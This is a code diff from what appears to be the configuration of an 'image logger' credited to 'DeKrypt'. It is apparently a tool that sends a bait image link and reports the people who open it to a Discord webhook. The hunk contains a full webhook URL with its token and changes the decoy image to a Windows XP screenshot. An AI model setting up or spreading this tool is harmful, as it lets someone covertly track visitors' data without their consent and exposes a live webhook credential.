@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1525743014947852388/meyr2fPjQM0kgcfrzxne6f74lJ824yE4gbcDnlGlY_97ua4DHA7IfE1aFRzyXT2Dpshh",
-    "image": "https://www.bing.com/images/search?view=detailV2&ccid=Ci0EbTV5&id=7D925136866A1790E6A647C11982307E3DC33008&thid=OIP.Ci0EbTV5hxkfKn5YIoDDRwAAAA&mediaurl=https%3A%2F%2Fimg.informer.com%2Fpe%2Fwinexplorer-v1.3-main-window-display.png&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.0a2d046d357987191f2a7e582280c347%3Frik%3DCDDDPX4wghnBRw%26pid%3DImgRaw%26r%3D0&exph=280&expw=395&q=winexp&FORM=IRPRST&ck=43B6ED523EF8D47FDB4AB7E6477A98F4&selectedIndex=0&itb=0&cw=1721&ch=895&ajaxhist=0&ajaxserp=0", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/6/64/Windows_XP_Luna.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
